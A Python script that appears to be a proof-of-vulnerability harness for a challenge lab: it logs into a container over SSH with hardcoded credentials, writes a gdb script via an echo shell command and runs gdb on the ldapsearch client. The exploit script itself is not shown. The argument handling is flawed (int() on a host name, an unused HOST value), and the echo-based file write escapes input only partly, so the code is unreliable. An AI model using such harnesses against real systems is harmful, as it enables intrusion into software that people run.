import paramiko

import os
import sys

def write_file( client, local_name, remote_name):
	f = open(local_name, 'rb')
	data = f.read().replace(b'$', b'\\$').replace(b'"', b'\\"')
	f.close()

	cmd = b'echo "' + data + b'" > ' + remote_name + b'\n'

	stdin, stdout, stderr = client.exec_command(cmd)

	stdin.close()
	stdout.close()
	stderr.close()

	return

def main( argv ):
    if len(sys.argv) == 2:
        HOST = int(argv[1])
    else:
        if 'HOST' in os.environ:
            HOST = os.environ['HOST']
        else:
            print('[USAGE] %s <host>' %(argv[0]))
            print('     This pov connects to the client via ssh then launches the ldapsearch')
            print('     client tool. In lieu of command line args you can use HOST')
            sys.exit(0)

    args = [b'gdb', b'--command=/home/chess/pov1.gdb.sc', b'/home/challenge/clients/tools/.libs/lt-ldapsearch']

    client = paramiko.SSHClient()

    client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy)

    client.connect('challenge_container', username='chess', password='chess')

    write_file(client, '/data/pov1.gdb.sc', b'/home/chess/pov1.gdb.sc')

    cmd = b' '.join(args)

    stdin, stdout, stderr = client.exec_command(cmd)

    res = stdout.read().split(b'\n')

    for x in res:
    	print(x)

    stdin.close()
    stdout.close()
    stderr.close()

    client.close()


if __name__ == '__main__':
  main(sys.argv)